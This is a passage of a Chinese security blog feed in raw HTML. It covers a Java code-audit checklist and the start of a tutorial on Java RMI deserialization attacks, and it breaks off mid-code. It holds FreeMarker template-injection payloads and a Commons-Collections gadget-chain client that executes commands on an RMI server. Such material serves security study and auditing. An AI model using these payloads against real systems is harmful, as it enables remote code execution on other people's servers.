href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 用户登陆、用户注册、找回密码等功能中密码信息未采用加密算法。</span><br><span class="line">2. 用户登陆、用户注册、找回密码等功能中`未采用验证码`或`验证码未做安全刷新`(未刷新Session中验证码的值)导致的撞库、密码爆破漏洞。</span><br><span class="line">3. 找回密码逻辑问题(如:可直接跳过验证逻辑直接发包修改)。</span><br><span class="line">4. 手机、邮箱验证、找回密码等涉及到动态验证码`未限制验证码失败次数`、`验证码有效期`、`验证码长度过短`导致的验证码爆破问题。</span><br><span class="line">5. 充值、付款等功能调用了第三方支付系统未正确校验接口(与第三方的交互、与客户的交互，主要查看逻辑问题)。</span><br><span class="line">6. 后端采用了`ORM框架`更新操作时因处理不当导致可以更新用户表任意字段(如:用户注册、用户个人资料修改时可以`直接创建管理员账号`或其他越权修改操作)。</span><br><span class="line">7. 后端采用了`ORM框架`查询数据时因处理不当导致可以接收任何参数导致的越权查询、敏感信息查询等安全问题。</span><br><span class="line">8. 用户中心转账、修改个人资料、密码、退出登陆等功能未采用验证码或`Token机制`导致存在`CSRF漏洞`。</span><br><span class="line">9. 后端服务过于信任前端，重要的参数和业务逻辑只做了前端验证(如:文件上传功能的文件类型只在JS中验证、后端不从Session中获取用户ID、用户名而是直接接收客户端请求的参数导致的`越权问题`)。</span><br><span class="line">10. 用户身份信息认证逻辑问题(如:后台系统自动登陆时直接读取Cookie中的用户名、用户权限不做验证)。</span><br><span class="line">11. 重要接口采用`ID自增、ID可预测并且云端未验证参数有效性`导致的越权访问、信息泄漏问题(如:任意用户订单越权访问)。</span><br><span class="line">12. `条件竞争问题`，某些关键业务(如:用户转账)不支持并发、分布式部署时不支持锁的操作等。</span><br><span class="line">13. 重要接口`未限制请求频率`，导致短信、邮件、电话、私信等信息轰炸。</span><br><span class="line">14. 敏感信息未保护，如`Cookie中直接存储用户密码等重要信息`，跟踪cookie中的变量最终到了哪。</span><br><span class="line">15. 弱加密算法、弱密钥，如勿把Base64当成数据加密方式、重要算法密钥采用弱口令如`123456`。</span><br><span class="line">16. 后端无异常处理机制、未自定义50X错误页面,服务器异常导致敏感信息泄漏(如:数据库信息、网站绝对路径等)。</span><br><span class="line">17. 使用`DWR框架`开发时前后端不分漏洞(如:DWR直接调用数据库信息把用户登陆逻辑直接放到了前端来做)。</span><br></pre></td></tr></table></figure><h4 id="硬编码"><a href="#硬编码" class="headerlink" title="硬编码"></a>硬编码</h4><p>审计的注意点</p><ul><li>审计源代码中是否有硬编码敏感信息。</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">password</span><br><span class="line">pass</span><br><span class="line">jdbc</span><br><span class="line">auth</span><br><span class="line">key</span><br></pre></td></tr></table></figure><h4 id="不安全的反射"><a href="#不安全的反射" class="headerlink" title="不安全的反射"></a>不安全的反射</h4><p>审计的注意点</p><ul><li>查看开发人员是否对反射调用方法、反射创建类实例进行了封装，并是否在对外的接口中进行了相关的调用。</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class.forName</span><br><span class="line">Method.invoke</span><br><span class="line">newInstance</span><br><span class="line">Worker/Invoker</span><br></pre></td></tr></table></figure><h4 id="使用了不安全的组件"><a href="#使用了不安全的组件" class="headerlink" title="使用了不安全的组件"></a>使用了不安全的组件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">组件例如 fastjson、jackson、xstream、shiro、xxl-job，框架例如 struts2、spring 等等，都要注意使用的版本问题。</span><br></pre></td></tr></table></figure><h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><ol><li>内建函数的利用：虽然FreeMarker中预制了大量的内建函数，极大地增强和拓展了模板的语言功能，但也可能引发一些危险操作。若研发人员不加以限制， 则很可能产生安全隐患。</li><li>new函数的利用：new函数可以创建一个继承自freemarker.template.TemplateModel 类的实例，查阅源码会发现freemarker.template.utility.Execute#exec可以执行 任意代码，因此可以通过new函数实例化一个Execute对象并执行exec() 方法造成任意代码被执行。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ObjectConstructor：&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;Java.lang. ProcessBuilder&quot;,&quot;calc.exe&quot;).start()&#125;</span><br><span class="line"></span><br><span class="line">JythonRuntime：&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os. system(&quot;calc.exe&quot;)&lt;/@value&gt;</span><br><span class="line"></span><br><span class="line">Execute：&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>api函数的利用：api函数可以用来访问Java API，使用方法为value?api.someJavaMethod()，相当于value.someJavaMethod()。因此可以利用api函数通过 getClassLoader来获取一个类加载器，进而加载恶意类。也可以通过getResource来读取服务器上的资源文件。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.getClassLoader()&gt;</span><br><span class="line">$&#123;classLoader.loadClass(&quot;Evil.class&quot;)&#125;</span><br></pre></td></tr></table></figure><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>审计的注意点</p><ul><li>一些增删改查方法，是否进行<code>Referer头检验</code>、<code>token检验</code> <code>无法构造的随机数参数</code>、<code>验证码密码</code></li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[&quot;token&quot;]</span><br></pre></td></tr></table></figure><h4 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h4><p>审计的注意点</p><ul><li>在每个<code>request.getParameter(&quot;userid&quot;);</code>之后查看是否有检验当前用户与要进行增删改查的用户。</li></ul><p>关键函数或字符串查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.getParameter(&quot;userid&quot;)</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://su18.org/post/code-audit/">https://su18.org/post/code-audit/</a></p><p><a href="https://github.com/Cryin/JavaID">https://github.com/Cryin/JavaID</a></p><p><a href="https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/">https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/</a></p><p>《网络安全JAVA代码审计实战》</p><p>《JAVA代码审计入门篇》</p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;整理下平时Java代码审计中常见的一些漏洞学习总结以及一些审计思路，后续会不断补充。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="https://kpa1on.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="https://kpa1on.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之RMI反序列化</title>
    <link href="https://kpa1on.github.io/2022/06/16/Java%E5%AE%89%E5%85%A8%E4%B9%8BRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://kpa1on.github.io/2022/06/16/Java%E5%AE%89%E5%85%A8%E4%B9%8BRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-06-16T10:31:20.000Z</published>
    <updated>2022-06-16T14:36:27.695Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p> Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><span id="more"></span><p>RMI可分为三大部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Server: 提供远程的对象</span><br><span class="line">Client:调用远程的对象</span><br><span class="line">Registry:一个注册表，存放着远程对象的位置（ip、端口、标识符）</span><br></pre></td></tr></table></figure><h3 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h3><ol><li>编写远程服务接口，该接口必须继承 java.rmi.Remote 接口，方法必须抛出java.rmi.RemoteException 异常；</li><li>编写远程接口实现类，该实现类必须继承 java.rmi.server.UnicastRemoteObject 类；</li><li>创建服务器实例，并且创建一个注册表，将需要提供给客户端的对象注册到注册到注册表中；</li><li>编写客户端并且调用远程对象；</li></ol><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>1、创建远程接口，继承java.rmi.Remote接口，并且修饰符需要为<code>public</code>否则远程调用的时候会报错，并且定义的方法里面需要抛出一个<code>RemoteException</code>的异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、实现远程接口，继承 java.rmi.server.UnicastRemoteObject类 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMIServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、创建服务器实例，并且创建一个注册表，将需要提供给客户端的对象注册到注册到注册表中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">RMIInterface</span> <span class="variable">rmiService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIServiceImpl</span>();<span class="comment">//创建远程对象</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建注册表</span></span><br><span class="line">        registry.bind(<span class="string">&quot;rmiService&quot;</span>, rmiService);<span class="comment">//将远程对象绑定到注册表里，并且设置为rmiService</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4、编写客户端并且调用远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);<span class="comment">//获取远程主机对象</span></span><br><span class="line">        <span class="type">RMIInterface</span> <span class="variable">rmiInterface</span> <span class="operator">=</span> (RMIInterface) registry.lookup(<span class="string">&quot;rmiService&quot;</span>);<span class="comment">//利用注册表的代理去查询远程注册表中名为rmiService的对象</span></span><br><span class="line">        System.out.println(rmiInterface.sayHello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果远程的这个方法有参数的话，调用该方法传入的参数必须是可序列化的。在传输中是传输序列化后的数据，服务端会对客户端的输入进行反序列化。客户端运行结果如下：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220616215129160-771244566.png" alt="image-20220616215127966"></p><h3 id="RMI攻击"><a href="#RMI攻击" class="headerlink" title="RMI攻击"></a>RMI攻击</h3><p>使用RMI反序列化攻击需要两个条件：第一个是接收Object类型的参数，第二就是RMI服务端存在命令执行的利用链。</p><p>远程接口的代码，需要定义一个Object类型的参数方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">work</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">void</span>  <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>远程接口实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RMIClientSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RMIServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span>  <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;say&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;work被调用了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say被调用了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">UserImpl</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>(port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">UserImpl</span><span class="params">(<span class="type">int</span> port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>(port, csf, ssf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>服务端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">//RMIInterface rmiService = new RMIServiceImpl();//创建远程对象</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建注册表</span></span><br><span class="line">        registry.bind(<span class="string">&quot;user&quot;</span>, user);<span class="comment">//将远程对象绑定到注册表里，并且设置为rmiService</span></span><br><span class="line">        System.out.println(<span class="string">&quot;rmi running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);//获取远程主机对象</span></span><br><span class="line"><span class="comment">//        RMIInterface rmiInterface = (RMIInterface) registry.lookup(&quot;rmiService&quot;);//利用注册表的代理去查询远程注册表中名为rmiService的对象</span></span><br><span class="line"><span class="comment">//        System.out.println(rmiInterface.sayHello());</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/user&quot;</span>;</span><br><span class="line">        <span class="type">User</span> <span class="variable">User</span> <span class="operator">=</span> (User) Naming.lookup(url);</span><br><span class="line">        User.work(getPayload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span 